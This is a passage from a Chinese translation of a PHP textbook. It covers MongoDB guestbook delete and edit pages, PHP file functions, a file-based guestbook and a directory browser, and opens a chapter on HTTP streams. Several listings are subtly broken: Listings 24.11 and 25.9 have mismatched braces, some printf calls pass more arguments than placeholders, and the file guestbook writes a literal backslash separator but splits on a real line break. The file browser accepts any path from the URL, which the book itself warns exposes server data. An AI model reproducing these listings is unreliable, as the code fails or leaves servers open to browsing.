要删除数据，我们需要 `deleteOne()` 方法和一个相应的查询。但是，在此处，我们想展示 MongoDB PHP 库 API 的另一个方法：`findOneAndDelete()`。这个名字显然不言自明。由于删除时通过 GET 参数传递 ID，我们可以这样表述：

```php
$db->findOneAndDelete(["_id" => new MongoDB\BSON\ObjectID($_GET["id"])]);
```

与本书中介绍的其他数据库系统相比，一个重要的变化是 ID 的验证。它不完全是数值，而是由字母和数字组成。使用 `ctype_alnum()`，我们可以检查是否只使用了这些字符。

以下清单显示了删除掩码的完整代码。





```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
require_once __DIR__ . "/vendor/autoload.php";

if (isset($_GET["id"]) && ctype_alnum($_GET["id"])) {
    if (isset($_GET["ok"])) {
        try {
            $conn = new MongoDB\Client();
            $db = $conn->PHP->guestbook;
            $db->findOneAndDelete(["_id" =>
                new MongoDB\BSON\ObjectID($_GET["id"])]);
            echo "<p>Entry deleted.</p>
            <p><a href=\"gb-admin.php\">Back to overview
            </a></p>";
        } catch (Exception $ex) {
            echo "Error: " . $ex->getMessage();
        }
    } else {
        printf("<a href=\"gb-admin.php?id=%s&ok=1\">Really delete?
        </a>", urlencode($_GET["id"]));
    }
} else {
    try {
        $conn = new MongoDB\Client();
        $db = $conn->PHP->guestbook;
        $result = $db->find();
        foreach ($result as $id => $row) {
            printf("<p><b><a href=\"gb-admin.php?id=%s\">Delete this entry </a>
            - <a href=\"gb-edit.php?id=%s\">Edit this entry</a></b></p>
            <p><a href=\"mailto:%s\"></a> wrote on at %s:</p>
            <h3>%s</h3>%s</p><hr noshade=\"noshade\" />",
            urlencode($row["_id"]),
            urlencode($row["_id"]),
            htmlspecialchars(utf8_decode($row["email"])),
            htmlspecialchars(utf8_decode($row["author"])),
            htmlspecialchars(date("Y-m-d, H:i", $row["date"])),
            htmlspecialchars(utf8_decode($row["heading"])),
            nl2br(htmlspecialchars(utf8_decode($row["entry"])))
        });
    }
}
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
}
?>
</body>
</html>
```

## 清单 24.11 带删除选项的所有数据显示 ("gb-admin.php")

### 24.3.5 编辑数据

最后，需要创建留言本的管理界面。特别是，可以在那里编辑现有条目。要首次显示它，必须先将其读取出来。为此，我们使用前一个示例创建相应的查询。此次使用的方法是 findOne()，因为 ID 应该是唯一的：

```
$row = $db->findOne(
    ["_id" => new MongoDB\BSON\ObjectID($_GET["id"])]
)
```

我们还扩展了输入表单，以便将创建时间作为表单的一部分提供。这简化了后续的更新，因为我们可以从表单数据中编译完整的新数据记录：

```
// PHP
$Date = $row["date"];
<!-- HTML -->
<input type="hidden" name="Date" value="<?php
echo htmlspecialchars($Date);
?>" />
```

发送表单后，我们创建一个新数组，然后使用 replaceOne() 替换旧数据记录：

```
// PHP
$data = [
    "heading" => utf8_encode($_POST["Heading"]),
    "entry" => utf8_encode($_POST["Comment"]),
    "author" => utf8_encode($_POST["Name"]),
    "email" => utf8_encode($_POST["Email"]),
    "date" => $_POST["Date"]
];
$db->replaceOne(["_id" => new MongoDB\BSON\ObjectID($_GET["id"])], $data);
```

就这样！清单 24.12 包含完整的连贯代码。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
$Name = "";
$Email = "";
$Heading = "";
$Comment = "";
$Date = "";

if (isset($_GET["id"]) &&
    ctype_alnum($_GET["id"])) {
    require_once __DIR__ . "/vendor/autoload.php";

    try {
        $conn = new MongoDB\Client();
        $db = $conn->PHP->guestbook;
        if (isset($_POST["Name"]) &&
            isset($_POST["Email"]) &&
            isset($_POST["Heading"]) &&
            isset($_POST["Comment"])) {
            $date = [
                "heading" => utf8_encode($_POST["Heading"]),
                "entry" => utf8_encode($_POST["Comment"]),
                "author" => utf8_encode($_POST["Name"]),
                "email" => utf8_encode($_POST["Email"]),
                "date" => $_POST["Date"]
            ];
            $db->replaceOne(["_id" =>
                new MongoDB\BSON\ObjectID($_GET["id"])], $date);
            echo "<p>Entry updated.</p>
            <p><a href=\"gb-admin.php\">Back to overview</a></p>";
        }

    if ($row = $db->findOne(["_id" =>
        new MongoDB\BSON\ObjectID($_GET["id"])])) {
        $Name = utf8_decode($row["author"]);
        $Email = utf8_decode($row["email"]);
        $Heading = utf8_decode($row["heading"]);
        $Comment = utf8_decode($row["entry"]);
        $Date = $row["date"];
    }
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" value="<?php
echo htmlspecialchars($Name);
?>" /><br />
Email Address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>" /><br />
Heading <input type="text" name="Heading" value="<?php
echo htmlspecialchars($Heading);
?>" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"><?php
echo htmlspecialchars($Comment);
?></textarea><br />
<input type="hidden" name="Date" value="<?php
echo htmlspecialchars($Date);
?>" />
<input type="submit" name="Submit" value="Update" />
</form>
</body>
</html>
```

## 清单 24.12 编辑留言本条目 ("gb-edit.php")

与介绍的其他系统相比，控制数据库甚至更加简单，因为我们不必担心数据类型和表架构。当然，这种灵活性也可能引起问题：例如，如果拼写错误数据库名称，MongoDB 不会报错，而是简单地创建一个新数据库。与关系型系统相比，此类错误更难检测。但是，MongoDB 绝对是我们数据库工具箱中一个令人兴奋的补充——即使在“真实”项目中也是如此。

### 24.4 设置

表 24.2 显示了 php.ini 配置文件中可用的 MongoDB 设置选项。

| 参数 | 描述 | 默认值 |
|---|---|---|
| mongodb.debug | 写入调试信息的日志文件路径（或 STDERR） | "" |

## 表 24.2 "php.ini" 中的（唯一）配置参数

# 第 V 部分

# 通信

# 第 25 章 文件

从 PHP 访问文件有多种方法；要全部掌握并不容易。但是，对于某些典型任务，也有能让一切变得非常简单的函数。

在使用 PHP 时，在本地文件系统上处理文件仍然扮演着重要但不断减少的角色。原因是带有数据库的托管套餐变得越来越实惠，而 PHP 还以 SQLite 的形式提供了一个非常实用的数据库，它不必以高资源成本在后台运行。1 将信息存储在数据库中的优势包括：数据可以快速检索、存在排序功能，并且 SQL 提供了查询这些数据的标准。尽管如此，如果你想快速完成任务（在编程时），应该使用简单的文件。PHP 提供了全套功能：来回打开、读取、写入和复制文件。别忘了：基于数据库运行的 CMS 也需要访问本地文件系统。因此，PHP 的文件功能不容小觑。

## 25.1 准备工作

PHP 内置了对文件操作的支持，因此不需要安装。但是，你应该始终确保 PHP 进程具有所需文件的读取甚至写入权限。否则，你会收到错误消息。

如果你的文件存储在网络主机上且可以通过 (S)FTP 访问，可以使用 `chmod` 调整文件权限——但只分配必要的权限，不要多分配。在你自己的系统中，访问权限是通过操作系统授予的。

> **提示**
>
> 在 Windows 中，访问文件时尤其经常会出现无法解释的错误。免费的 Filemon 工具通常在这里很有帮助，可从 www.sysinternals.com 获得（该网站现已被微软收购）。Filemon 记录文件访问，包括发生的任何错误（见图 25.1）。其后继工具 Process Monitor（同一来源）提供了更多选项。你可以快速查看 PHP 尝试访问哪些文件，以及是否成功。

1 在第 20 章中，我们介绍了 SQLite。





![](img/ae7820c36e8f24c1623d26668b28e80e_706_0.png)

图 25.1 访问文件时文件监视器有助于故障排除

php.ini PHP 配置文件中也有一些实用设置。有关详细信息，可参见第 25.4 节。

## 25.2 PHP 中的文件处理

处理文件有两种不同的方法。你可以以内容为中心，即文件可以打开和关闭，你可以读取数据，也可以自行向其中写入数据。或者，你可以关注文件系统本身，将文件复制到特定位置。我们将在以下各节中介绍这两种选项。

### 25.2.1 使用文件

如你在数据库章节中所见，我们始终遵循相同的结构：首先描述如何创建到数据库的连接，然后如何发送查询并读取返回值。我们希望以类似的方式处理文件。

### 文件模式

第一步是打开文件。为此，请使用 fopen()，其中 f 代表 file。当然，fopen() 期望将文件名作为绝对路径或相对路径的参数。你还必须指定文件模式；这是文件打开的方式。所选文件模式取决于以下因素：

- 读取或写入访问权限，还是两者都有？
- 如果文件尚不存在，是否应创建它？
- 是应将新数据添加到文件末尾，还是应覆盖现有数据？

共有五种文件模式：

- 1. a 表示写入访问权限，并在文件末尾追加新数据
- 2. r 表示读取访问权限
- 3. w 表示写入访问权限，并覆盖现有数据
- 4. c 表示写入访问权限并覆盖现有数据，但在打开现有文件时不会立即删除内容（与 w 不同）
- 5. x 表示创建并写入新文件

对于所有五种模式，你可以在模式标识符中添加加号（+），以便同时拥有读取和写入访问权限。表 25.1 显示了所有 10 种可能模式的概览。

| 模式 | 读取访问权限 | 写入访问权限 | 追加 | 覆盖 | 现有文件警告 |
|---|---|---|---|---|---|
| a | - | + | + | - | - |
| a+ | + | + | + | - | - |
| r | + | - | - | - | - |
| r+ | + | + | - | + | - |
| w | - | + | - | + | - |
| w+ | + | + | - | + | - |
| c | - | + | - | + | - |
| c+ | + | + | - | + | - |
| x | - | + | - | + | + |
| x+ | + | + | - | + | + |

表 25.1 "fopen()" 的文件模式

“现有文件警告”列表示，如果文件已存在，fopen() 会返回警告。这是 w 和 x 文件模式的主要区别：在后一种模式下，如果文件已存在，PHP 会发出警告。

但这还不是全部。你还可以在 10 种模式中添加两个进一步选项之一：

- b 以二进制模式打开文件，以便数据不会转换为本地字符集。这尤其推荐用于二进制文件。²

- t 另一方面，会转换文件：Unix/Linux 换行符（\n）会更改为 Windows 换行符（\r\n）。

fopen() 的返回值是所谓的文件句柄，³ 即一个数值，指示刚刚打开的文件。然后，你可以将此值用于所有其他文件操作，这些操作现在知道（得益于句柄）指的是哪个文件。

以下脚本首先创建文件，然后再次将其关闭（使用 fclose()）。

```php
<?php
if ($file = fopen("test.txt", "wb")) {
    echo "File was created!";
    fclose($file);
} else {
    echo "File could not be created!";
}
?>
```

清单 25.1 创建文件（"file-create.php"）

这项努力的回报是当前目录中的 test.txt 文件。它目前大小仍为 0 字节，但这将会改变。无论如何，请务必使用 fclose() 关闭文件。PHP 会尝试在脚本结束时自动执行此操作，但你永远不知道！

### 路径中的文件

如果 fopen() 的第三个参数设置为 true，fopen() 会（也）在 PHP 的 include_path 中搜索要打开的文件。这是一个 PHP 配置变量，指定了通过 include、include_once、require 和 require_once 加载的文件可以定位的目录（除非指定了绝对路径）。以下调用打开一个 PHP 文件，并同时搜索 include_path：

```php
$file = fopen("file.php", "r", true);
```

不用说，include_path 的使用仅与读取访问相关。文件始终相对于当前路径创建，除非你使用绝对路径规范。

### 写入数据

要向（打开的！）文件写入数据，请使用 fwrite() 函数。第一个参数是文件句柄；第二个参数是文本。作为第三个参数，你可以可选地指定最大长度，以确定应写入多少数据。如果你想接受并缩短来自外部来源（如数据库或用户）的数据，这可能很有趣。无论如何，请确保你以前以具有写入访问权限的模式打开了文件（即，不是 r 模式）。

```php
<?php
if ($file = fopen("test.txt", "wb")) {
    if (fwrite($file, "All of life is a test\r\n") &&
        fwrite($file, "and we are only the candidates.")) {
        echo "File has been filled!";
    } else {
        echo "Error while writing!";
    }
    fclose($file);
} else {
    echo "File could not be opened!";
}
?>
```

清单 25.2 填充文件（"file-write.php"）

fwrite() 的返回值是写入的字节数——如果无法写入，则为 false。清单 25.2 中的代码展示了这一点。图 25.2 显示了文件的新内容。

![](img/ae7820c36e8f24c1623d26668b28e80e_709_0.png)

图 25.2 数据已写入文件

### 快速写入文件

过程相对较快，但仍需要三个调用：fopen()、fwrite() 和 fclose()。一步完成，你可以使用 file_put_contents() 函数。你只需指定文件名和要写入的数据；PHP 会处理其余部分。函数的返回值是新文件的大小，或者如果出错则为 false：

```php
<?php
file_put_contents("test.txt",
    "All of life is a test\r\n");
?>
```

你可以为 `file_put_contents()` 指定几个更多选项作为第三个参数；例如，`FILE_APPEND` 常量，它以追加模式打开文件：

```php
<?php
file_put_contents("test.txt",
    "and we are only the candidates",
    FILE_APPEND);
?>
```

结果仍然是一个 `test.txt` 文件，内容与之前相同。还有 `LOCK_EX` 常量，用于请求文件的独占锁。

### 读取数据

虽然打开和写入文件非常简单，且每种情况只有少数选择，但读取时有许多选项。你可以一次获取所有数据，也可以逐行读取，甚至逐个字符读取。让我们从最快的选项开始：一次性全部读取。这是由 `file_put_contents()` 的姐妹函数——即 `file_get_contents()` 完成的。你只需传递一个文件名，即可接收完整的文件内容，如下一个清单和图 25.3 所示。

```php
<?php
$all = file_get_contents("test.txt");
echo "<pre>" . htmlspecialchars($all) . "</pre>";
?>
```

清单 25.3 完整读取文件（"file-read-all.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_710_0.png)

图 25.3 Web 浏览器中的文件内容——使用 "file_get_contents()"

甚至可以更快：`fpassthru()` 会将指定文件句柄的所有数据发送到客户端。然后你甚至省去了 `echo` 语句，但（与示例不同）你无法使用 `htmlspecialchars()` 进行编码。

旧的访问方法（按行工作）仍然有效。例如，在评估日志文件时很有用：你读取每一行（对应一条日志条目）并对其进行处理。相应的函数是 `fgets()`。但这里有一个小特点：你必须指定要读取的最大字符数。如果一行中的数据多于你指定的数量，你将无法获取完整的一行。因此，你需要确切了解要读取的文件长什么样。长度的一个好值是 4,096 字节，即 4 KB。通过文件句柄在 PHP 中可访问的文件指针，在读取操作后会移动到下一个未读字符。但是，读取在行末或文件末尾结束，因此你永远不会得到多于一行的内容。

你仍然需要了解的唯一信息是如何确定文件末尾。这可以用 feof() 完成，其中 eof 代表 end of file。

```php
<?php
$file = fopen("test.txt", "rb");
while (!feof($file)) {
    $line = fgets($file, 4096);
    echo htmlspecialchars($line);
}
fclose($file);
?>
```

清单 25.4 逐行读取文件（"file-read-lines.php"）

### 行末

请注意，fgets() 读取的字符串（如果存在）包含行末。如果你只关心实际行内容，而不关心 \r\n，你可能需要删除最后一个字符（如果需要的话；最后一行不一定以换行符结尾）。

### 更多可能性

当然，访问文件中的信息还有许多其他方法，但在实践中并不常见。使用 fgetc()，你可以获取指定文件的下一个字符。这意味着你可以逐字输出其内容。

也可以在打开的文件中导航。使用 fseek()，你可以将文件指针移动到指定位置（从文件开头按字节计数）。使用 fseek($file, 0)，你可以跳回文件开头，为此也提供了 rewind($file) 别名。你可以使用 ftell($file) 获取文件指针的当前位置。最后再次警告：如果以 a 或 a+ 模式打开文件，数据始终会附加到文件末尾，即使你之前调用了 rewind() 或 fseek()。

一如既往，PHP 在线手册为所有介绍的函数及更多内容提供了进一步信息。





### 25.2.2 使用文件系统

如果您不仅关心文件的实际数据，还关心其在文件系统中的作用，那么本节中的函数将为您提供帮助。

### 文件信息

首先，有多种辅助函数可以揭示文件的信息。在处理文件之前（示例中为`test.txt`），您可能对几个事项感兴趣：

- 文件是否已存在？
- 如果是，我可以写入该文件吗？
- 谁拥有该文件，它甚至是一个文件吗（或者是一个目录）？

PHP 为所有这些问题提供了答案，如表 25.2 所示。

| 函数 | 描述 |
|---|---|
| `file_exists()` | 文件是否存在？ |
| `is_dir()` | 是否是一个目录？ |
| `is_executable()` | 是否是一个可执行文件？ |
| `is_file()` | 是否是一个文件？ |
| `is_link()` | 是否是一个链接？ |
| `is_readable()` | 文件是否可读？ |
| `is_uploaded_file()` | 是否是通过 HTTP 上传* 的文件？ |
| `is_writable()` | 可以写入该文件吗？ |
| * 关于此信息可在第 13 章中找到。 | |

表 25.2 关于文件的信息

以下清单为先前创建的文件`test.txt`确定此信息；图 25.4 显示了其输出。

```php
<?php
vprintf("<table><tr><th>Function</th><th>Value</th></tr>
<tr><td><code>file_exists()</code></td><td>%s</td></tr>
<tr><td><code>is_dir()</code></td><td>%s</td></tr>
<tr><td><code>is_executable()</code></td><td>%s</td></tr>
<tr><td><code>is_file()</code></td><td>%s</td></tr>
<tr><td><code>is_link()</code></td><td>%s</td></tr>
<tr><td><code>is_readable()</code></td><td>%s</td></tr>
<tr><td><code>is_uploaded_file()</code></td><td>%s</td></tr>
<tr><td><code>is_writable()</code></td><td>%s</td></tr>
</table>",
[
var_export(file_exists("test.txt"), true),
var_export(is_dir("test.txt"), true),
var_export(is_executable("test.txt"), true),
var_export(is_file("test.txt"), true),
var_export(is_link("test.txt"), true),
var_export(is_readable("test.txt"), true),
var_export(is_uploaded_file("test.txt"), true),
var_export(is_writable("test.txt"), true)
]);
?>
```

清单 25.5 关于文件的大量信息（"file-infos.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_713_0.png)

图 25.4 "test.txt" 文件的信息

> Tip
>
> 在清单 25.5 中，我们使用了 var_export() 函数。它的行为类似于 var_dump()，但作为第二个参数，您可以指定是否输出（false；默认值）或返回（true）有关指定变量的信息。无论如何，都需要调用 var_dump() 或 var_export()，因为直接输出文件函数的返回值会在 true 时得到 1，在 false 时得到空字符串。

### 文件操作

这些行的作者曾为一本 PHP 行业期刊撰写过一篇文章。总编辑提前发送了一篇关于相关主题的文章，该文章已经在那里出现过，以避免重复。以下是其中的一段摘录（当然略有修改）：

```
system("cp file.xyz /path/to/target-directory/file.xyz");
```

这还不止是笨拙。system() 函数在操作系统层面执行命令，这不仅在性能上代价高昂，还存在潜在的安全风险。在这种情况下，它甚至更加不恰当，因为仅仅复制一个文件不需要操作系统命令——当然也不需要像这种情况一样依赖于操作系统的命令。PHP 的平台独立性因此被践踏。此外：PHP 提供了您处理文件所需的一切。您从命令行熟悉的命令——mkdir、cp 或 COPY、rm 或 DEL——在 PHP 中也都可行。表 25.3 提供了概述。

| PHP | Unix/Linux/macOS | Windows（命令行） | 功能 |
|---|---|---|---|
| `copy("Source", "Destination")` | cp Source Destination | COPY Source Destination | 复制文件 |
| `mkdir("Directory")` | mkdir directory | MKDIR directory | 创建目录 |
| `rename("Source", "Destination")` | mv Source Destination | RENAME Source Destination MOVE Source Destination | 重命名或移动文件或目录 |
| `rmdir("Directory")` | rmdir directory | RMDIR directory | 删除空目录 |
| `unlink("File")` | rm file | DEL file | 删除文件 |

表 25.3 用于文件操作的一些 PHP 函数

### 系统操作

您可以使用 exec() 代替 system()；该函数不会输出任何内容，但通常会在操作系统层面执行命令。有两种等效选项可用于查询此类操作的返回值：

- 使用反引号运算符指定命令：

```php
$directory = `pwd`;
```

- 使用 shell_exec():

```php
$directory = shell_exec("pwd");
```

再次确认，已执行的命令与操作系统无关（在示例中，它不是！）。

### "dir" 类

要在文件系统中工作，PHP 有其自己的名为 dir 的集成类。这允许方便且面向对象地访问目录中的所有数据。您可以使用目录名称实例化该类，然后例如使用 read() 来确定下一个目录条目并将其输出，如下一个清单和图 25.5 所示。

```php
<?php
$d = dir(".");
while (($entry = $d->read()) != false) {
    echo htmlspecialchars($entry) . "<br />";
}
$d->close();
?>
```

清单 25.6 当前目录中的所有文件（"dir.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_715_0.png)

图 25.5 输出当前目录中的文件

或者，您可以按以下方式进行：opendir() 创建目录句柄，而 readdir() 确定目录中的当前文件并将文件指针向前移动一个条目。以下清单中的代码与 dir.php 产生相同的结果。

```php
<?php
$d = opendir(".");
while (($entry = readdir($d)) != false) {
    echo htmlspecialchars($entry) . "<br />";
}
closedir($d);
?>
```

清单 25.7 以替代方式确定当前目录中的所有文件（"dir-alternative.php"）

### 实际路径与虚拟路径

要确定当前脚本的实际路径，有一个非常简单的技巧：使用 __FILE__ 常量（在 FILE 前后各有两个下划线）。您可以在图 25.6 中看到以下代码的输出：

```php
<?php
echo "The current script is called " . __FILE__;
?>
```

![](img/ae7820c36e8f24c1623d26668b28e80e_716_0.png)

**图 25.6** 通过 "__FILE__" 获取完整文件名

使用 dirname() PHP 函数，您将获得目录。而不是 $d = dir(".")，您也可以使用以下方式在当前目录中启动：

```php
$d = dir(dirname(__FILE__));
```

您还可以使用 __DIR__ 常量更简洁地获取当前目录的名称。PHP 还提供了一个函数，可将虚拟路径（例如，Web 服务器路径，如 /php/dir/php）转换为绝对路径（例如，/usr/htdocs/php/dir.php）：realpath()。需要注意的是，路径或文件必须存在；否则，无法执行转换，realpath() 将返回 false。

## 25.3 应用示例

至此，您已初步了解在 PHP 中处理文件的最重要技术。是时候将这些付诸实践了。

### 25.3.1 留言本

留言本主要在私人网站上为访客留下留言给站长以及彼此交换信息提供了一个受欢迎的机会。使用数据库实现这一点特别容易——事实上，如此容易，以至于本书的整个数据库部分（参见第四部分）包含一个完整的留言本示例。但它也可以使用文件来实现，尽管不那么方便。

目标很明确：用户应该能够在留言本中输入留言。留言本数据存储在文本文件中。为了使以后尽可能容易地读取，我们使用序列化技术，它可以将对象转换为字符串（并再转换回去）。我们首先将条目的所有数据存储在关联数组中：

```php
$data = ["headline" => $_POST["Heading"],
	"entry" => $_POST["Comment"],
	"author" => $_POST["Name"],
	"email" => $_POST["Email"],
	"date" => date("Y-m-d, H:i")];
```

重点：这些数据通过 serialize() 转换为字符串。但这可能仍然包含换行符，这使得以后读取变得困难。问题是：条目从哪里开始，在哪里结束？但也有解决方案：base64_encode() 对数据执行 Base64 编码，例如电子邮件程序也是如此。这消除了所有换行符，但数据对于人类来说是不可读的：

```php
$data = base64_encode(serialize($data));
```

基本上就是这样。清单中仍然包含一些安全查询，例如留言本文件是否已存在（如果不存在，将创建它）。然后读取留言本的先前内容：

```php
$olddata = file_get_contents("guestbook.txt");
```

在写入文件时，将先写入新条目，然后写入所有旧条目：

```php
file_put_contents("guestbook.txt", "$data\r\n$olddata");
```

原因：在留言本中，首先显示最新条目是合理的。如果您使用文件模式 "a" 打开了留言本文件，则只能在末尾追加数据，因此最新条目也会出现在输出的最末尾（除非您花更多精力）。

以下清单显示了完整脚本。

```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
	isset($_POST["Email"]) &&
	isset($_POST["Heading"]) &&
	isset($_POST["Comment"])) {
$data = ["heading" => $_POST["Heading"], "entry" => $_POST["Comment"],
	"author" => $_POST["Name"],
```





```php
"email" => $_POST["Email"],
"date" => date("Y-m-d, H:i")];
$data = base64_encode(serialize($data));
if (!file_exists("guestbook.txt")) {
    $file = fopen("guestbook.txt", "xb");
    fclose($file);
}
$olddata = file_get_contents("guestbook.txt");
if (file_put_contents("guestbook.txt", "$data\\r\\n$olddata") ) {
    echo "Entry added.";
} else {
    echo "Error!";
}
}
?>
```

```html
<form method="post" action="">
Name <input type="text" name="Name" /><br />
Email address <input type="text" name="Email" /><br />
Heading <input type="text" name="Heading" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

### 列表 25.8 向访客簿插入数据 ("gb-enter.php")

图 25.7 显示了用户在访客簿中留下评论的界面；图 25.8 显示了随后创建的文本文件。

![](img/ae7820c36e8f24c1623d26668b28e80e_718_0.png)

### 图 25.7 向访客簿插入数据的界面

![](img/ae7820c36e8f24c1623d26668b28e80e_719_0.png)

### 图 25.8 生成的文本文件（全部为一行）

## 锁定文件

如果先从文件读取，然后再写入，那么锁定文件以防止其他访问是有意义的；否则，对访客簿的两个并行访问可能会引起问题。假设 A 和 B 同时在访客簿中输入内容。操作系统按以下顺序执行对 *访客簿.txt* 所需的访问：

- 对 A 读取访客簿
- 对 B 读取访客簿
- 对 A 写入访客簿
- 对 B 写入访客簿

结果：A 的条目丢失了，因为当 B 读取访客簿时，A 的条目尚未存在。因此，锁定访客簿是有意义的。并非每个操作系统和文件系统都支持此功能（尤其是来自 Microsoft 的旧 FAT 文件系统不支持），但否则它工作得相当好。使用 `flock()`，你可以创建锁并再次释放它。但是，然后必须使用 `fopen()` 打开文件：

```php
$file = fopen("guestbook.txt", "w+");
flock($file, LOCK_EX);
//Read out data
...
//Write data back
...
flock($file, LOCK_UN);
```

读取和输出访客簿数据也不困难。你可以逐行读取文件，但对于巨大的访客簿条目，你最终会达到为 `fgets()` 指定的第二个参数的限制。因此，最好使用 `file_get_contents()` 读取完整的访客簿，然后将其拆分为各行：

```php
$data = file_get_contents("guestbook.txt");
$data = explode("\\r\\n", $data);
```

> **提示**
> 或者，你也可以使用 `file()`，它返回相同的数组，但所有数组项末尾仍带有换行符。

这意味着 `$data` 现在包含单个条目的数组。可以使用 `base64_decode()` 和 `unserialize()` 将这些条目转换回原始形式，即关联数组。最后一步是以格式化形式输出这些数据。以下列表显示了完整代码；图 25.9 显示了输出。

```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>

<?php
if (file_exists("guestbook.txt") &&
is_readable("guestbook.txt")) {
$data = file_get_contents("guestbook.txt");
$data = explode("\r\n", $data);
for ($i = 0; $i < count($data); $i++) {
$entry = unserialize(base64_decode($data[$i]));
if (is_array($entry)) {
printf("<p><a href=\"mailto:%s\"></a> wrote on/at %s:</p>
<h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
urlencode($entry["email"]),
htmlspecialchars($entry["author"]),
htmlspecialchars($entry["date"]),
htmlspecialchars($entry["heading"]),
nl2br(htmlspecialchars($entry["entry"])))
};
}
}
?>
</body>
</html>
```

### 列表 25.9 从访客簿读取数据 ("gb-show.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_721_0.png)

### 图 25.9 基于文件的访客簿

## 25.3.2 文件浏览器

得益于 `dir` 类，查看服务器端目录中包含的内容非常简单。因此，编写一个提供基于浏览器的服务器硬盘导航的文件浏览器的想法显而易见。使用 PHP 这不是问题：会读取并输出目录中的所有条目。使用哪个目录在 `d` URL 参数中指定：

```php
$directory = $_GET["d"] ?? ".";
```

对于所有文件夹条目（使用 `is_dir()` 判断），你会创建指向当前脚本的链接，并将文件夹名称作为参数传递：

```php
<?php
$script = htmlspecialchars($_SERVER["PHP_SELF"]);
$directory = $_GET["d"] ?? ".";
echo "<h1>". htmlspecialchars(realpath($directory)) . "</h1>";
$d = opendir($directory);
while (($entry = readdir($d)) != false) {
    if (is_dir("$directory/$entry")) {
        echo "<a href=\"$script?d=" .
            urlencode("$directory/$entry") .
            "\">". htmlspecialchars("$entry/") . "</a><br />";
    } else {
        echo htmlspecialchars($entry) . "<br />";
    }
}
closedir($d);
?>
```

你可以在标题中看到一个特殊功能。如果使用文件浏览器进行一些导航，URL 中指定的路径会变得越来越长，因为文件名在那里没有被正确解析（此解析也称为 _规范化_）。此时，$directory 将具有类似 ./folder1/../folder2/... 的值，也可以用 .. 将其写短得多。PHP 不提供执行此操作的函数，但它至少能够将相对路径转换为绝对路径，如前所述：使用 realpath()。这也会执行规范化：

```php
echo "<h1>" . htmlspecialchars(realpath($directory)) . "</h1>";
```

请检查以下完整的列表；其输出在图 25.10 中显示。

```php
<?php
$script = htmlspecialchars($_SERVER["PHP_SELF"]);
$directory = $_GET["d"] ?? ".";
echo "<h1>" . htmlspecialchars(realpath($directory)) . "</h1>";
$d = opendir($directory);
while (($entry = readdir($d)) !== false) {
    if (is_dir("$directory/$entry")) {
        echo "<a href=\"$script?d=" .
             urlencode("$directory/$entry") .
             "\">" . htmlspecialchars("$entry/") . "</a><br />";
    } else {
        echo htmlspecialchars($entry) . "<br />";
    }
}
closedir($d);
?>
```

### 列表 25.10 代码量少的文件浏览器 ("filebrowser.php")

文件浏览器不包含任何错误检查，因此你可能会收到一条消息，表明你没有足够的权限查看目录内容。这是一个很好的测试，可以了解你的提供商对其 Web 服务器的保护程度如何。你还应该考虑对路径本身使用 realpath()，因为已知 URL 长度是有限的。

一个明显的扩展（同样未实现）是显示文件。但是，这相对简单：首先使用 is_file() 检查条目是否为文件，然后使用 is_readable() 检查是否可能有读取权限。如果两个函数都返回 true，则可以将文件名链接到第二个脚本，其中仅通过 URL 传递的文件名借助 file_get_contents() 输出。

![](img/ae7820c36e8f24c1623d26668b28e80e_723_0.png)

### 图 25.10 运行中的文件浏览器

> **注意**
> 此脚本仅适用于内部使用；绝不应向外部方提供对脚本的访问，否则您的 Web 服务器上的所有数据可能会暴露。因此，您应该确保脚本足够安全——例如，使用第 33 章中所示的技术。

## 25.4 设置

php.ini 配置文件包含表 25.4 中列出的文件操作选项。

| 参数 | 描述 | 默认值 |
| :--- | :--- | :--- |
| allow_url_fopen | 指定是否也可以通过 fopen() 打开 URL* | "1" |
| auto_detect_line_endings | 指定是否应自动确定文件的行结束符（\r、\n 或 \r\n） | "Off" |
| realpath_cache_size | realpath() 调用的缓存大小 | "16K" |
| realpath_cache_ttl | realpath() 缓存条目的生存期 | "120" |

\*有关详细信息，请参见第 26 章。

### 表 25.4 "php.ini" 中的配置参数





# 第 26 章
HTTP 及更远：与外部世界的连接

在面向服务架构和 Web 服务的时代，外部通信是利用服务和其他数据源（通过 HTTP 或其他协议）的必要手段。

PHP 以与其他技术非常亲和而闻名；使用 PHP 与另一台计算机建立连接也很简单。Web 上为此提供了成熟的协议，例如 (S)FTP 和 HTTP(S)，而 PHP 全部支持。

现在，与其他计算机通信有一种特别便捷的方式：访问文件的方式与您在上一章中看到的完全相同。不过，针对特殊应用仍有专用函数，本章也会对其做简要介绍。

尤其是在与其他计算机通信时，存在许多大大小小的特殊之处；Unix/Linux 尤其提供了特殊技术，而 Windows 也有自己的（专有）方式。本章我们特意专注于最重要的与操作系统无关的技术。

## 26.1 准备工作

本章中的大多数示例无需预先安装即可运行。访问外部计算机已集成到 PHP 中，因为如前所述，使用的是熟悉的文件函数。

如果要使用 SSL 或 SFTP 连接，必须在 Unix/Linux 上使用 OpenSSL 编译 PHP。Windows 用户可以省略此步骤；官方二进制文件中已完成此操作。不过，有必要在 php.ini 中指定 extension=php_openssl.dll 指令或其短形式 extension=openssl。

## 26.2 使用 PHP 进行外部连接

使用 PHP 与外部世界建立连接有两种方式：使用所谓的流（streams）形式，即与文件处理相同的机制；或使用 PHP 内置的协议特定函数。本章专门介绍流，因为它们功能更为强大。

> **注意**
> 第 27 章展示了与另一台计算机交换消息的进一步（且标准化）选项：通过 Web 服务等。

### 26.2.1 流

